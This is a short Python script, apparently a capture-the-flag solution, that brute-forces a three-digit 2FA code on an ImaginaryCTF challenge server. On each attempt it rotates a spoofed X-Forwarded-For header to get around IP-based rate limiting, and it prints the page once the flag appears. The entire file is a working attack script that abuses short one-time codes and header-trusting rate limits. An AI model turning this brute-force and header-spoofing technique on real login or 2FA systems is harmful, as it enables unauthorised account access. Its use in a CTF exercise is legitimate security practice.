from requests import Session


url = "http://puzzler7.imaginaryctf.org:6001//"
s = Session()
s.get(url + "2fa")
for code in range(1000):
    code = "{:03d}".format(code)
    print(code)
    r = s.post(url + "2fa", {"code": code}, headers={"X-Forwarded-For": f"11{code[0]}.{code[1]}.{code[2]}.1"})
    if "flag" in r.text:
        print(r.text)
        break
